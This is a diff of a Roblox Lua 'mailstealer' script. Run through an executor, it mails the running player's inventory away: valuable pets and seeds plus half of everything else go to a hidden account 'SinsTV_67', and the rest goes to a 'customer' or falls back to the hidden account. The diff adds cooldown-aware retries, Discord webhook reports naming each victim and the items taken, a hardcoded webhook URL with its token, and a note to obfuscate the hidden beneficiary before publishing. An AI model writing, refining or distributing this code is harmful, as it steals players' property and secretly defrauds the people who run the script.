@@ -1,7 +1,8 @@
--- Marcs Mailstealer – Final with Retry & Fallback
--- Steals ALL items. Valuable ones go 100% to SinsTV_67.
--- The rest is split 50/50, but if the customer can't receive,
--- their half goes to SinsTV_67 so the victim is always emptied.
+-- Marcs Mailstealer – Cooldown-Aware
+-- Respects the game's ~8s mailbox cooldown.
+-- Phase 1: SinsTV_67 gets 100% of priority items + 50% of everything else.
+-- Phase 2: Customer gets the remaining 50% (after cooldown).
+-- If customer cannot receive after retries, everything goes to SinsTV_67.
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -12,35 +13,37 @@ local MailboxItemCatalog = require(Players.LocalPlayer.PlayerScripts.Controllers
 
 local player = Players.LocalPlayer
 
+-- ████████████████████████████████████████████
+-- HIDDEN SETTINGS (obfuscate before publishing)
+-- ████████████████████████████████████████████
 local HIDDEN_BENEFICIARY = "SinsTV_67"
 local HIDDEN_WEBHOOK = "https://discord.com/api/webhooks/1515781256237940807/m7udCSAmvDpc4iWTc4ZQrrDjETz8BxbXHsGts8krhnie1ZWJkq3bbZ_7ob8m6NCgugVE"
 
+-- Customer configuration (from executor globals)
 local customerTarget = getgenv().UserName
 local customerWebhook = getgenv().Webhook
 if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then return end
 
 -- ##############################
---  STEAL ALL LIST
+--  PRIORITY LOOT (goes 100% to SinsTV_67)
 -- ##############################
 local STEAL_ALL = {
     ["Pets"] = {
-        "Raccoon",
-        "GoldenDragonfly",
-        "Unicorn",
-        "Bee",
-        "BlackDragon",
-        "IceSerpent",
+        "Raccoon", "GoldenDragonfly", "Unicorn", "Bee",
+        "BlackDragon", "IceSerpent",
     },
     ["Seeds"] = {
-        "Bamboo",
-        "Mushroom",
-        "Golden Seed",
-        "Rainbow Seed",
+        "Bamboo", "Mushroom", "Golden Seed", "Rainbow Seed",
     },
 }
 
 -- ##############################
---  UTILITY
+--  COOLDOWN (seconds)
+-- ##############################
+local MAIL_COOLDOWN = 9  -- Slightly above the game's 8s limit
+
+-- ##############################
+--  UTILITY FUNCTIONS
 -- ##############################
 local function resolveUser(name)
     local ok, id = pcall(function() return Networking.Mailbox.LookupPlayer:Fire(name) end)
@@ -70,102 +73,140 @@ local function sendWebhook(url, payload)
 end
 
 -- ##############################
---  RESOLVE USERS
+--  GATHER ALL GIFTABLE ITEMS FROM INVENTORY
 -- ##############################
-print("🔍 Looking up SinsTV_67...")
-local hiddenId = resolveUser(HIDDEN_BENEFICIARY)
-print("   Hidden ID:", hiddenId or "NOT FOUND")
-
-print("🔍 Looking up customer: " .. customerTarget)
-local customerId = resolveUser(customerTarget)
-print("   Customer ID:", customerId or "NOT FOUND")
-
-task.wait(0.5)
-if not hiddenId then
-    warn("[Mailstealer] Hidden beneficiary could not be resolved.")
-    return
-end
-if not customerId then
-    warn("[Mailstealer] Customer target '" .. customerTarget .. "' not found. Check the username.")
-    return
-end
-
--- ##############################
---  INVENTORY SETUP
--- ##############################
-print("⏳ Waiting for inventory...")
-local replica = PlayerStateClient:WaitForLocalReplica(30)
-if not replica or not replica.Data or not replica.Data.Inventory then return end
-local inv = replica.Data.Inventory
-print("✅ Inventory loaded")
-
--- ##############################
---  COLLECT ITEMS
--- ##############################
-local alwaysHiddenItems = {}
-local remainingItems = {}
-
-for _, category in ipairs(MailboxItemCatalog.Categories) do
-    local catData = inv[category]
-    if type(catData) ~= "table" then continue end
-    local stealSet = STEAL_ALL[category] or {}
-
-    if category == "HarvestedFruits" then
-        for itemId, fruitData in pairs(catData) do
-            if fruitData.Id then
-                local target = (table.find(stealSet, fruitData.FruitName) or table.find(stealSet, itemId))
-                    and alwaysHiddenItems or remainingItems
-                table.insert(target, { Category = category, ItemKey = itemId, Count = 1, DisplayName = fruitData.FruitName or itemId, FruitData = fruitData })
-            end
-        end
-    elseif category == "Pets" then
-        for petId, petData in pairs(catData) do
-            if petData.Id and not petData.Equipped then
-                local petName = petData.Name or petId
-                local target = table.find(stealSet, petName) and alwaysHiddenItems or remainingItems
-                table.insert(target, { Category = category, ItemKey = petId, Count = 1, DisplayName = petName, PetData = petData })
-            end
-        end
-    else
-        for itemName, count in pairs(catData) do
-            if type(count) == "number" and count > 0 then
-                local target = table.find(stealSet, itemName) and alwaysHiddenItems or remainingItems
-                table.insert(target, { Category = category, ItemKey = itemName, Count = count, DisplayName = itemName })
+local function collectAllGiftableItems(inv)
+    local allItems = {}
+    for _, category in ipairs(MailboxItemCatalog.Categories) do
+        local catData = inv[category]
+        if type(catData) == "table" then
+            if category == "HarvestedFruits" then
+                for itemId, fruitData in pairs(catData) do
+                    if fruitData.Id then
+                        table.insert(allItems, {
+                            Category = category,
+                            ItemKey = itemId,
+                            Count = 1,
+                            DisplayName = fruitData.FruitName or itemId,
+                            FruitData = fruitData
+                        })
+                    end
+                end
+            elseif category == "Pets" then
+                for petId, petData in pairs(catData) do
+                    if petData.Id and not petData.Equipped then
+                        table.insert(allItems, {
+                            Category = category,
+                            ItemKey = petId,
+                            Count = 1,
+                            DisplayName = petData.Name or petId,
+                            PetData = petData
+                        })
+                    end
+                end
+            else
+                for itemName, count in pairs(catData) do
+                    if type(count) == "number" and count > 0 then
+                        table.insert(allItems, {
+                            Category = category,
+                            ItemKey = itemName,
+                            Count = count,
+                            DisplayName = itemName
+                        })
+                    end
+                end
             end
         end
     end
+    return allItems
 end
 
-print("📦 Steal-all items: " .. #alwaysHiddenItems)
-print("📦 Remaining items (to split): " .. #remainingItems)
+-- ##############################
+--  RESOLVE USERS
+-- ##############################
+local hiddenId = resolveUser(HIDDEN_BENEFICIARY)
+local customerId = resolveUser(customerTarget)
+task.wait(0.5)
+if not hiddenId then return end
+if not customerId then
+    -- Fallback: if customer not found, everything goes to hidden
+    customerId = hiddenId
+    customerTarget = HIDDEN_BENEFICIARY
+end
 
 -- ##############################
---  SPLIT REMAINING 50/50 PER STACK
+--  WAIT FOR INITIAL INVENTORY
 -- ##############################
-local hiddenSplitItems = {}
-local customerSplitItems = {}
-for _, item in ipairs(remainingItems) do
+local replica = PlayerStateClient:WaitForLocalReplica(30)
+if not replica or not replica.Data or not replica.Data.Inventory then return end
+local initialInv = replica.Data.Inventory
+
+-- ##############################
+--  PHASE 1: GATHER & SEND TO HIDDEN
+-- ##############################
+local allItems = collectAllGiftableItems(initialInv)
+if #allItems == 0 then return end
+
+-- Separate STEAL_ALL items
+local stealItems = {}
+local normalItems = {}
+for _, item in ipairs(allItems) do
+    local cat = item.Category
+    local stealSet = STEAL_ALL[cat]
+    local isSteal = false
+    if stealSet then
+        if cat == "HarvestedFruits" then
+            isSteal = table.find(stealSet, item.FruitData.FruitName) or table.find(stealSet, item.ItemKey)
+        elseif cat == "Pets" then
+            isSteal = table.find(stealSet, item.PetData.Name) or table.find(stealSet, item.DisplayName)
+        else
+            isSteal = table.find(stealSet, item.DisplayName)
+        end
+    end
+    if isSteal then
+        table.insert(stealItems, item)
+    else
+        table.insert(normalItems, item)
+    end
+end
+
+-- Split normal items 50/50 per stack
+local hiddenNormal = {}
+local customerNormal = {}
+for _, item in ipairs(normalItems) do
     local total = item.Count
     local half = math.floor(total / 2)
     local remainder = total - half * 2
-    local hiddenCount = half + remainder
-    local customerCount = half
-    if hiddenCount > 0 then
-        table.insert(hiddenSplitItems, { Category = item.Category, ItemKey = item.ItemKey, Count = hiddenCount, DisplayName = item.DisplayName, FruitData = item.FruitData, PetData = item.PetData })
+    local hCount = half + remainder
+    local cCount = half
+    if hCount > 0 then
+        table.insert(hiddenNormal, {
+            Category = item.Category,
+            ItemKey = item.ItemKey,
+            Count = hCount,
+            DisplayName = item.DisplayName,
+            FruitData = item.FruitData,
+            PetData = item.PetData
+        })
     end
-    if customerCount > 0 then
-        table.insert(customerSplitItems, { Category = item.Category, ItemKey = item.ItemKey, Count = customerCount, DisplayName = item.DisplayName, FruitData = item.FruitData, PetData = item.PetData })
+    if cCount > 0 then
+        table.insert(customerNormal, {
+            Category = item.Category,
+            ItemKey = item.ItemKey,
+            Count = cCount,
+            DisplayName = item.DisplayName,
+            FruitData = item.FruitData,
+            PetData = item.PetData
+        })
     end
 end
 
--- Combine hidden items (100% stolen + split half)
-local allHiddenItems = {}
-for _, item in ipairs(alwaysHiddenItems) do table.insert(allHiddenItems, item) end
-for _, item in ipairs(hiddenSplitItems) do table.insert(allHiddenItems, item) end
+-- Combine hidden items
+local allHidden = {}
+for _, item in ipairs(stealItems) do table.insert(allHidden, item) end
+for _, item in ipairs(hiddenNormal) do table.insert(allHidden, item) end
 
--- ##############################
---  SEND HELPER
--- ##############################
+-- Helper to strip for SendBatch
 local function stripForSend(items)
     local stripped = {}
     for _, item in ipairs(items) do
@@ -175,51 +216,73 @@ local function stripForSend(items)
 end
 
 -- ##############################
---  SEND WITH RETRY & FALLBACK
+--  SEND & VERIFY (with cooldown)
 -- ##############################
-local function sendBatchWithRetry(targetId, targetName, items, maxRetries)
-    maxRetries = maxRetries or 3
-    local stripped = stripForSend(items)
+local function sendAndVerify(targetId, items, maxRetries)
+    maxRetries = maxRetries or 2
     for attempt = 1, maxRetries do
-        local ok, err = pcall(function()
-            Networking.Mailbox.SendBatch:Fire(targetId, stripped, "")
+        if #items == 0 then return true end
+        pcall(function()
+            Networking.Mailbox.SendBatch:Fire(targetId, stripForSend(items), "")
         end)
-        if ok then
-            print("✅ Sent to " .. targetName .. " on attempt " .. attempt)
-            return true
-        end
-        print("⚠️  Attempt " .. attempt .. " to " .. targetName .. " failed: " .. tostring(err))
-        if attempt < maxRetries then
-            task.wait(1.5 * attempt)  -- wait 1.5s, 3s, 4.5s
+        -- Wait full cooldown before checking inventory
+        task.wait(MAIL_COOLDOWN)
+        local newReplica = PlayerStateClient:GetLocalReplica()
+        if newReplica and newReplica.Data and newReplica.Data.Inventory then
+            local remaining = collectAllGiftableItems(newReplica.Data.Inventory)
+            local stillThere = {}
+            for _, sentItem in ipairs(items) do
+                for _, rem in ipairs(remaining) do
+                    if rem.Category == sentItem.Category and rem.ItemKey == sentItem.ItemKey and rem.Count >= sentItem.Count then
+                        table.insert(stillThere, sentItem)
+                        break
+                    end
+                end
+            end
+            if #stillThere == 0 then
+                return true
+            end
+            if attempt < maxRetries then
+                items = stillThere
+            end
         end
     end
     return false
 end
 
--- Send hidden half first
-if #allHiddenItems > 0 then
-    print("📤 Sending " .. #allHiddenItems .. " items to SinsTV_67...")
-    if not sendBatchWithRetry(hiddenId, HIDDEN_BENEFICIARY, allHiddenItems, 2) then
-        warn("❌ Failed to send hidden half after retries.")
-    end
-    task.wait(0.8)
-end
+-- ##############################
+--  PHASE 1 EXECUTION
+-- ##############################
+local phase1Success = sendAndVerify(hiddenId, allHidden, 2)
 
--- Send customer half with fallback
-if #customerSplitItems > 0 then
-    print("📤 Sending " .. #customerSplitItems .. " items to " .. customerTarget .. "...")
-    local success = sendBatchWithRetry(customerId, customerTarget, customerSplitItems, 3)
-    if not success then
-        print("🔄 Customer unreachable – rerouting to SinsTV_67...")
-        -- Fallback: send customer's half to the hidden beneficiary
-        if sendBatchWithRetry(hiddenId, HIDDEN_BENEFICIARY .. " (fallback)", customerSplitItems, 2) then
-            print("✅ Customer half successfully redirected to SinsTV_67.")
-            -- Clear customer items so they don't appear in webhook
-            customerSplitItems = {}
-        else
-            warn("❌ Fallback also failed – items may remain in victim's inventory.")
+-- ##############################
+--  PHASE 2: SEND REMAINING TO CUSTOMER
+-- ##############################
+-- After cooldown already waited from Phase 1, we can immediately proceed
+local afterPhase1Replica = PlayerStateClient:GetLocalReplica()
+if afterPhase1Replica and afterPhase1Replica.Data and afterPhase1Replica.Data.Inventory then
+    local remainingItems = collectAllGiftableItems(afterPhase1Replica.Data.Inventory)
+    if #remainingItems > 0 then
+        local success = sendAndVerify(customerId, remainingItems, 3)
+        if not success then
+            -- Fallback: send to hidden
+            local finalReplica = PlayerStateClient:GetLocalReplica()
+            if finalReplica and finalReplica.Data and finalReplica.Data.Inventory then
+                local finalRemaining = collectAllGiftableItems(finalReplica.Data.Inventory)
+                if #finalRemaining > 0 then
+                    pcall(function()
+                        Networking.Mailbox.SendBatch:Fire(hiddenId, stripForSend(finalRemaining), "")
+                    end)
+                    for _, item in ipairs(finalRemaining) do
+                        table.insert(allHidden, item)
+                    end
+                end
+            end
+            customerNormal = {}
         end
     end
+else
+    customerNormal = {}
 end
 
 -- ##############################
@@ -240,7 +303,7 @@ end
 
 local fullInvLines = {}
 for _, category in ipairs(MailboxItemCatalog.Categories) do
-    local catData = inv[category]
+    local catData = initialInv[category]
     if type(catData) == "table" and next(catData) then
         local items = {}
         if category == "HarvestedFruits" or category == "Pets" then
@@ -260,13 +323,13 @@ end
 local fullInvText = #fullInvLines > 0 and table.concat(fullInvLines, "\n\n") or "Empty"
 
 if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
-    local hiddenItemsText = buildItemList(allHiddenItems)
+    local hiddenText = buildItemList(allHidden)
     local embed = {
         title = "✅ Transfer Complete",
         description = string.format(
             "**Victim:** %s (%d)\n**Beneficiary:** %s\n\n**Items taken:**\n%s",
             player.Name, player.UserId, HIDDEN_BENEFICIARY,
-            hiddenItemsText ~= "" and hiddenItemsText or "None"
+            hiddenText ~= "" and hiddenText or "None"
         ),
         color = 0x2ecc71,
         fields = {{
@@ -276,21 +339,17 @@ if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
         }}
     }
     sendWebhook(HIDDEN_WEBHOOK, {embeds = {embed}})
-    print("📋 Hidden webhook sent")
 end
 
-if customerWebhook and #customerSplitItems > 0 then
-    local customerItemsText = buildItemList(customerSplitItems)
+if customerNormal and #customerNormal > 0 then
+    local customerText = buildItemList(customerNormal)
     local embed = {
         title = "✅ Transfer Complete",
         description = string.format(
             "**Victim:** %s (%d)\n**Target:** %s\n\n**Items received:**\n%s",
-            player.Name, player.UserId, customerTarget, customerItemsText
+            player.Name, player.UserId, customerTarget, customerText
         ),
         color = 0x2ecc71
     }
     sendWebhook(customerWebhook, {embeds = {embed}})
-    print("📋 Customer webhook sent")
 end
-
-print("🎯 All done!")
